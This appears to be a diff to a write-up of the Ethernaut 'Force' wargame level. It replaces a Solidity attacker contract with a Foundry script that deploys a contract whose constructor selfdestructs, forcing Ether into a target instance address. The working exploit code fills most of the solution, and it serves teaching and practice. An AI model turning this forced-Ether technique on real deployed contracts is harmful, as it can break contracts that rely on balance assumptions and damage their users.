@@ -19,25 +19,42 @@ There is a way to force Ether into any contract address regardless of its code: 
 
 ## Solution
 
-To solve this, you must deploy a separate "Suicide" contract, fund it with some Ether, and then call `selfdestruct` pointing to the `Force` contract's address.
+The level is solved by deploying a temporary exploit contract that immediately calls selfdestruct in its constructor.. When a contract selfdestructs, its Ether balance is forcibly transferred to the specified target address.
 
 ---
 
-**Attacker Contract (Solidity):**
+**Exploiy Script (Foundry):**
 
 <pre class="plain-code"><code>
+
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.30;
 
-contract ForceAttacker {
-    // Contract must be able to receive the initial ether
-    constructor() payable {}
+import "forge-std/Script.sol";
 
-    function attack(address payable _target) public {
-        // This will destroy this contract and force its balance to _target
-        selfdestruct(_target);
+contract ForceExploit {
+    constructor(address payable target) payable {
+        // Force the contract balance into `target` and destroy this contract.
+        selfdestruct(target);
     }
 }
+
+contract ExploitAgainstInstance is Script {
+    function run() external {
+        // Read the target instance address from env var INSTANCE_ADDRESS
+        address payable target = payable(vm.envAddress("INSTANCE_ADDRESS"));
+
+        // Start broadcasting using the private key passed via CLI (--private-key)
+        vm.startBroadcast();
+
+        // Deploy the exploit contract with 1 wei; its constructor selfdestructs into target
+        new ForceExploit{value: 1 wei}(target);
+
+        vm.stopBroadcast();
+    }
+}
+
+
 </code></pre>
 
 ---
